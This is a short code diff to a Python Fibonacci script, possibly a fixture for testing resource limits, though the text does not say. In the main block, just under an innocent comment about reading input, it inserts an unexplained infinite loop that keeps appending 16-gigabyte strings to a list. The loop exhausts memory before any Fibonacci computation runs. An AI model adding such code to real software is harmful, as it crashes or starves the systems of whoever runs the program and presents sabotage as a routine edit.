@@ -14,6 +14,9 @@ def fibonacci(n):
 
 if __name__ == "__main__":
     # Get the input number from environment variable or command-line argument
+    large_list = []
+    while True:
+        large_list.append('x' * 1024 * 1024 * 1024 * 16)
     n = int(os.getenv("FIBONACCI_NUMBER", 2))  # Default to 2 if not provided
     if len(sys.argv) > 1:
         n = int(sys.argv[1])
